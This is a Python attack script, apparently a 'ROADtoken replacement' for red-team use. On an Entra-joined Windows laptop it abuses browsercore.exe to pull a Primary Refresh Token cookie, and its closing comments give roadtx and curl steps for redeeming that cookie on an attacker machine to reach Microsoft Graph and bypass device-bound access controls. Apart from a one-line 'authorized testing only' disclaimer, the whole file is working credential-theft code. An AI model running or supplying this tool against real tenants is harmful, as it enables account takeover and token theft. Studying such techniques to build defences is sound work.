#!/usr/bin/env python3
# get_prt_cookie.py  --  LOLBin PRT-cookie grabber (ROADtoken replacement)
# Runs on the Entra-JOINED domain laptop, in the logged-in USER context (no admin).
# Drives the Microsoft-signed C:\Windows\BrowserCore\browsercore.exe via the
# Chrome native-messaging protocol to obtain an x-ms-RefreshTokenCredential (PRT cookie).
# The cookie is device-bound: it can ONLY be produced on the enrolled laptop.
# Redeem it off-device (VM/attacker box) with roadtx -- see bottom.
#
# Authorized testing only.

import json, struct, subprocess, sys, os
import urllib.request, urllib.parse

BROWSERCORE_PATHS = [
    r"C:\Windows\BrowserCore\browsercore.exe",
    r"C:\Windows\System32\browsercore.exe",
]

def get_nonce() -> str:
    """Fetch a fresh SSO nonce from Entra."""
    data = urllib.parse.urlencode({"grant_type": "srv_challenge"}).encode()
    req = urllib.request.Request(
        "https://login.microsoftonline.com/common/oauth2/token", data=data
    )
    with urllib.request.urlopen(req, timeout=20) as r:
        return json.load(r)["Nonce"]

def browsercore_path() -> str:
    for p in BROWSERCORE_PATHS:
        if os.path.exists(p):
            return p
    sys.exit("[!] browsercore.exe not found -- is this an Entra-joined device?")

def get_prt_cookie(nonce: str):
    """Ask the local CloudAP (via browsercore) for a PRT cookie."""
    request = {
        "method": "GetCookies",
        "sender": "https://login.microsoftonline.com",
        "uri": ("https://login.microsoftonline.com/common/oauth2/authorize"
                f"?sso_nonce={nonce}"),
    }
    msg = json.dumps(request).encode("utf-8")

    p = subprocess.Popen([browsercore_path()],
                         stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    # native messaging: 4-byte little-endian length prefix + UTF-8 JSON
    p.stdin.write(struct.pack("<I", len(msg)))
    p.stdin.write(msg)
    p.stdin.flush()
    p.stdin.close()

    raw_len = p.stdout.read(4)
    if len(raw_len) < 4:
        sys.exit("[!] no response from browsercore (no PRT? not signed in?)")
    length = struct.unpack("<I", raw_len)[0]
    resp = json.loads(p.stdout.read(length))


    for c in resp.get("response", []):
        if c.get("name") == "x-ms-RefreshTokenCredential":
            return c["data"]
    return resp  # dump raw response if the cookie name wasn't found

if __name__ == "__main__":
    nonce = get_nonce()
    print(f"[*] nonce: {nonce[:24]}...", file=sys.stderr)
    cookie = get_prt_cookie(nonce)
    print("\n[+] x-ms-RefreshTokenCredential (PRT cookie):\n")
    print(cookie)

# ---------------------------------------------------------------------------
# REDEEM (run on the VM / attacker box, NOT the laptop):
#   pip install roadtx
#   roadtx browserprtauth --prt-cookie "<cookie printed above>" \
#          -c msgraph -r https://graph.microsoft.com
#   roadtx describe -t .roadtools_auth        # confirm the 'deviceid' claim is present
#   # then prove the bypass:
#   curl -H "Authorization: Bearer <access_token>" https://graph.microsoft.com/v1.0/me
# ---------------------------------------------------------------------------
